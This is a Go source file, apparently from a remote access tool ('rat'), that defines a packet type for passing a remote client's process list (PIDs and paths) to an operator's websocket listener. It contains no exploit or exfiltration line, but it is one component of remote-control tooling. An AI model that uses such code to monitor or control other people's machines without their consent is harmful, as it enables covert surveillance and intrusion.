package main

import (
	"rat/shared/network/header"

	"gopkg.in/mgo.v2/bson"
)

type Process struct {
	Path string `network:"send"`
	PID  int    `network:"send,receive"`
}

type ProcessPacket struct {
	Action    int       `network:"send,receive"`
	Processes []Process `network:"send,receive"`
}

func (packet ProcessPacket) Header() header.PacketHeader {
	return header.ProcessHeader
}

func (packet ProcessPacket) Init(c *Client) {

}

func (packet ProcessPacket) OnReceive(c *Client) error {
	for _, proc := range packet.Processes {
		if ws, ok := c.Listeners[header.ProcessHeader]; ok {
			err := sendMessage(ws, c, ProcessMessage{proc.PID, proc.Path})

			if err != nil {
				return err
			}
		}
	}

	delete(c.Listeners, header.ProcessHeader)

	return nil
}

func (packet ProcessPacket) Decode(buf []byte) (IncomingPacket, error) {
	err := bson.Unmarshal(buf, &packet)
	return packet, err
}
